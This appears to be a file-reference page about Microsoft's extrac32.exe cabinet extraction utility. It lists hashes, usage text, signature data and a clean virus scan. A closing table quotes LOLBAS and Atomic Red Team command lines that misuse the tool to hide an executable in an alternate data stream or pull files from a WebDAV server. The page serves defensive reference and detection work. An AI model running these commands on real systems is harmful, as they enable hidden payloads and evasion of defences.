---
title: extrac32.exe | Microsoft CAB File Extract Utility
excerpt: What is extrac32.exe?
---

# extrac32.exe 

* File Path: `C:\WINDOWS\SysWOW64\extrac32.exe`
* Description: Microsoft CAB File Extract Utility

## Hashes

Type | Hash
-- | --
MD5 | `AEC60237D13789DEBBFCA362C42247F9`
SHA1 | `E8CE8E622BE8C4D04DC51FCC12AE017A620ED78C`
SHA256 | `777957B5F985DEE9DA8C5F5EB017D2A3B35E0B0F7B2C71268AD2DD70F8AA3C61`
SHA384 | `E6F3AABFA333A3C854CABB5F7CDEF2D1990EDC0B23D140FB9BCDFC834D379943600F0E21A2386E733CF3874EC7BD8D0C`
SHA512 | `C2C0B348A652C93FE5504B439E1373C5916C2EA39CC7F879FF6627FD95548BB1DE0B2E2008CE860360C5B11A924E480929C0C0E35476F8C7EED538B8710BA695`
SSDEEP | `768:nYDhe6vip2X1PLDroYNIrA2UrCYTz1OSHD:nOheqq2lPXNIr1i1O`
IMP | `7B1D3FE0DC6AA68A34FB0D96A1457FE6`
PESHA1 | `D537A5869064A8FDACB2A98E721B98D208E0A18B`
PE256 | `8BBF8BC6E8E6DE6896D41F4EBC613B9130C7D365E0428C70F376D963F37B8AAB`

## Runtime Data

### Usage (stdout):
```cmhg
Microsoft (R) Cabinet Extraction Tool
Copyright (c) Microsoft Corporation. All rights reserved..

EXTRACT [/Y] [/A] [/D | /E] [/L dir] cabinet [filename ...]
EXTRACT [/Y] source [newname]
EXTRACT [/Y] /C source destination

  cabinet  - Cabinet file (contains two or more files).
  filename - Name of the file to extract from the cabinet.
             Wild cards and multiple filenames (separated by
             blanks) may be used.

  source   - Compressed file (a cabinet with only one file).
  newname  - New filename to give the extracted file.
             If not supplied, the original name is used.

  /A         Process ALL cabinets.  Follows cabinet chain
             starting in first cabinet mentioned.
  /C         Copy source file to destination (to copy from DMF disks).
  /D         Display cabinet directory (use with filename to avoid extract).
  /E         Extract (use instead of *.* to extract all files).
  /L dir     Location to place extracted files (default is current directory).
  /Y         Do not prompt before overwriting an existing file.
```

### Loaded Modules:

Path |
-- |
C:\WINDOWS\SYSTEM32\ntdll.dll |
C:\WINDOWS\System32\wow64.dll |
C:\WINDOWS\System32\wow64base.dll |
C:\WINDOWS\System32\wow64con.dll |
C:\WINDOWS\System32\wow64cpu.dll |
C:\WINDOWS\System32\wow64win.dll |
C:\WINDOWS\SysWOW64\extrac32.exe |


## Signature

* Status: Signature verified.
* Serial: `33000002ED2C45E4C145CF48440000000002ED`
* Thumbprint: `312860D2047EB81F8F58C29FF19ECDB4C634CF6A`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: extrac32.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 5.00 (WinBuild.160101.0800)
* Product Version: 5.00
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 32-bit

## File Scan

* VirusTotal Detections: 0/73
* VirusTotal Link: https://www.virustotal.com/gui/file/777957b5f985dee9da8c5f5eb017d2a3b35e0b0f7b2c71268ad2dd70f8aa3c61/detection


## Possible Misuse

*The following table contains possible examples of `extrac32.exe` being misused. While `extrac32.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `Name: Extrac32.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32.exe /C C:\Windows\System32\calc.exe C:\Users\user\Desktop\calc.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Path: C:\Windows\System32\extrac32.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Path: C:\Windows\SysWOW64\extrac32.exe`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1564.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md) | extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020-2021 Strontic.


